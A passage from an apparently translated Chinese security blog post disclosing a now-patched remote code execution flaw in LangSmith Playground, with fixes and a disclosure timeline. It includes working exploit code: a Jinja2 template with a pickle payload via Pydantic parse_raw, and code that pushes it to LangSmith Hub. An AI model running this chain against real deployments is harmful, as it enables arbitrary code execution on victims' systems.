作为 manifest 的一部分加载，而 manifest 对类名没有验证。换句话说，我可以完全避免深入了解 LangSmith Playground 的实现细节，而是使用 partial_variables  
在模板渲染期间访问对象。同时，我在 Python 代码中重新创建了请求中的 manifest：  
```
from langchain_core.language_models import FakeListLLM
from langchain_core.messages import HumanMessage
from langchain_core.prompts.chat import ChatPromptTemplate, SystemMessagePromptTemplate, HumanMessagePromptTemplate
from langchain_core.prompts.prompt import PromptTemplate
from langchain_core.runnables import RunnableSequence

template = "{{msg.parse_raw(payload.encode().decode('unicode_escape').encode('latin1'),allow_pickle=True,proto='pickle')}}"
payload = "\\x80\\x04\\x95!\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x05posix\\x94\\x8c\\x06system\\x94\\x93\\x94\\x8c\\x06whoami\\x94\\x85\\x94R\\x94."
msg = HumanMessage("")

s = RunnableSequence(
    first=ChatPromptTemplate(
        messages=[
            SystemMessagePromptTemplate(
                prompt=PromptTemplate(
                    input_variables=[],
                    template_format="f-string",
                    template="You are a chatbot.",
                ),
            ),
            HumanMessagePromptTemplate(
                prompt=PromptTemplate(
                    input_variables=[],
                    template_format="jinja2",
                    template=template,
                    partial_variables={
                        "payload": payload,
                        "msg": msg,
                    },
                ),
            ),
        ],
    ),
    last=FakeListLLM(responses=[""]),
)
s.invoke({})
```  
  
如您所见，payload 和对象直接传递给 PromptTemplate  
。当我在本地运行它时，我看到了预期的结果：  
```
0xn3va
Traceback (most recent call last):
  ...
```  
  
下一步是 使用 SDK 将恶意请求推送到 LangSmith Hub：  
```
from dotenv import load_dotenv
from langchain_core.messages import HumanMessage
from langchain_core.prompts.chat import ChatPromptTemplate, SystemMessagePromptTemplate, HumanMessagePromptTemplate
from langchain_core.prompts.prompt import PromptTemplate
from langsmith import Client

template = "{{msg.parse_raw(payload.encode().decode('unicode_escape').encode('latin1'),allow_pickle=True,proto='pickle')}}"
payload = "\\x80\\x04\\x95!\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x05posix\\x94\\x8c\\x06system\\x94\\x93\\x94\\x8c\\x06whoami\\x94\\x85\\x94R\\x94."
msg = HumanMessage("")

prompt = ChatPromptTemplate(
    messages=[
        SystemMessagePromptTemplate(
            prompt=PromptTemplate(
                input_variables=[],
                template_format="f-string",
                template="You are a chatbot.",
            ),
        ),
        HumanMessagePromptTemplate(
            prompt=PromptTemplate(
                input_variables=[],
                template_format="jinja2",
                template=template,
                partial_variables={
                    "payload": payload,
                    "msg": msg,
                },
            ),
        ),
    ],
)

# create .env file and add LANGSMITH_API_KEY there
load_dotenv(dotenv_path=".env")

client = Client(api_url="https://eu.api.smith.langchain.com", workspace_id="<workspace-id>")
url = client.push_prompt("test-prompt", object=prompt)
print(url)
```  
  
现在我们可以从 LangSmith Hub 拉取恶意提示并使用相同的 SDK 调用它：  
```
from dotenv import load_dotenv
from langchain_core.language_models import FakeListLLM
from langsmith import Client

# create .env file and add LANGSMITH_API_KEY there
load_dotenv(dotenv_path=".env")

client = Client(api_url="https://eu.api.smith.langchain.com", workspace_id="7201d811-22bb-4ddf-8f1b-9e3ba2590bd9")
prompt = client.pull_prompt("test-prompt")
llm = FakeListLLM(responses=[""])
s = prompt | llm
s.invoke({})
```  
  
正如预期的那样，代码被执行了：  
```
0xn3va
Traceback (most recent call last):
  ...
```  
  
从攻击者的角度来看，这意味着访问泄露的 LangSmith API 密钥可以在受害者的 CI/CD 甚至生产应用程序中执行任意代码。  
## 要点  
  
**模板格式化器比看起来更强大**  
：Python 的 f-string  
和 mustache  
格式化器支持高级属性访问和元素检索功能，这些功能超越了简单的变量替换。这些功能可以链接在一起以遍历对象层次结构，通过 __globals__  
访问全局命名空间，并在不需要函数调用的情况下检索敏感数据。不要低估看似简单的字符串格式化的攻击面。  
  
**Jinja2 沙箱不是万能药**  
：虽然 Jinja2 的 SandboxedEnvironment  
阻止直接访问危险属性并限制某些操作，但它只检查模板执行上下文内发生的事情。内部执行不安全操作的方法可以绕过沙箱限制。您并不总是需要 Jinja2 本身的漏洞来逃离沙箱——在应用程序的对象模型中寻找通过看似安全的方法调用暴露危险功能的 gadget。  
  
**序列化 + 用户输入 = 高风险组合**  
：当应用程序反序列化用户控制的对象并将它们传递给模板引擎时，攻击面会急剧扩大。攻击者不再局限于内置类型，而是可以访问可能暴露危险原语的自定义类及其方法。始终调查可以将哪些类型的对象作为模板变量传递。  
  
**已弃用的功能是宝库**  
：遗留和已弃用的方法通常包含安全问题。Pydantic 的支持 pickle 的 parse_raw  
方法是一个完美的例子——它提供了通往任意代码执行的直接路径，尽管它是维护良好的库的一部分。在寻找 gadget 时，要特别注意可能在安全审计中被忽视的已弃用功能。  
## 修复  
  
LangChain 团队在短短几天内发布了初始修复。修复的开源部分影响了 langchain_core  
，限制了 f-string  
和 mustache  
格式化器的属性（.  
）和索引（[]  
）访问，并实现了更严格的 Jinja2 沙箱，阻止了对所有属性和方法的访问。这些更改有效地防止了漏洞的利用，但对反序列化任意对象的担忧仍然存在。几周后，团队恢复了 Jinja2 沙箱限制，并为 langchain_core  
添加了反序列化加固。加固引入了用于反序列化的允许对象列表，并在反序列化期间阻止了 jinja2  
模板。  
  
所有更改都可以在以下拉取请求中找到：  
- https://github.com/langchain-ai/langchain/pull/34038 - 为 langchain_core  
中的模板格式化器添加加固。  
  
- https://github.com/langchain-ai/langchain/pull/34072 - 恢复 langchain_core  
中的 Jinja2 沙箱限制。  
  
- https://github.com/langchain-ai/langchain/pull/34455 - 为 langchain_core  
中的反序列化添加加固。  
  
- https://github.com/langchain-ai/langchainjs/pull/9707 - 为 @langchain/core  
中的反序列化添加加固。  
  
LangChain 在 langchain  
和 langchainjs  
存储库中发布了三个公告：  
- GHSA-6qv9-48xg-fc7f  
  
- GHSA-c67j-w6g6-q2cm  
  
- GHSA-r399-636x-v7f6  
  
## 披露时间线  
- 16/11/25 - 向 LangChain 团队发送初始报告。  
  
- 17/11/25 - 团队的初步响应。  
  
- 19/11/25 - 已为 OSS 部分发布公告和补丁。  
  
- 20/11/25 - 授予赏金。  
  
- 23/12/25 - 已为 OSS 部分发布公告和补丁。  
  
---  
> Achieving remote code execution in LangSmith Playground using unsafe template formatting  
> 免责声明：本博客文章仅用于教育和研究目的。提供的所有技术和代码示例旨在帮助防御者理解攻击手法并提高安全态势。请勿使用此信息访问或干扰您不拥有或没有明确测试权限的系统。未经授权的使用可能违反法律和道德准则。作者对因应用所讨论概念而导致的任何误用或损害不承担任何责任。  
  
  
  
